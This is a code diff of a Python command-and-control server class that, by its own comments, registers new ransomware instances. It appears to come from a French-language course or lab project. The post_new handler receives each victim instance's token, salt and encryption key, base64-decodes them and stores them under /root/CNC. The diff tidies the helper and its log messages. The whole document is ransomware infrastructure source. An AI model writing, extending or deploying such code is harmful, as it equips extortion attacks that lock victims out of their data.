@@ -8,41 +8,29 @@ from cncbase import CNCBase
 class CNC(CNCBase):
     ROOT_PATH = "/root/CNC"
 
-    def save_b64(self, token:str, data:str, filename:str):
+    def save_b64(self, data:str, filename:str):
         # helper
         # token and data are base64 field
 
         bin_data = base64.b64decode(data)
-        path = os.path.join(self.ROOT_PATH, filename)
+        path = os.path.join(CNC.ROOT_PATH, filename)
         with open(path, "wb") as f:
             f.write(bin_data)
 
     def post_new(self, path:str, params:dict, body:dict)->dict:
         # used to register new ransomware instance
 
-        #body = base64.decode(body)
-
-        print(f"Données reçues : {body}")
-        print(f"Les données sont de type : {type(body)}")
-
         token = body["token"]
         salt = body["salt"]
         key = body["key"]
 
         print(f"Token importé : {token}, type de données : {type(token)}")
-        print(f"Token importé : {salt}, type de données : {type(salt)}")
-        print(f"Token importé : {key}, type de données : {type(key)}")
+        print(f"Salt importé : {salt}, type de données : {type(salt)}")
+        print(f"Clé importée : {key}, type de données : {type(key)}")
 
         #self.save_b64(token, path, "token.bin")
-        self.save_b64(salt, CNC.ROOT_PATH, "salt.bin")
-        self.save_b64(key, CNC.ROOT_PATH, "key.bin")
-        
-        #os.mkdir(CNC.ROOT_PATH + "/token")
-        #with open(CNC.ROOT_PATH + "/token.bin") as file_token:
-        #    file_token.write(token)
-        
-        #with open(CNC.ROOT_PATH + "/salt.bin") as file_salt:
-        #    file_salt.write(salt)       
+        self.save_b64(salt, "salt.bin")
+        self.save_b64(key, "key.bin")    
 
         return {"status" : "OK"}
 
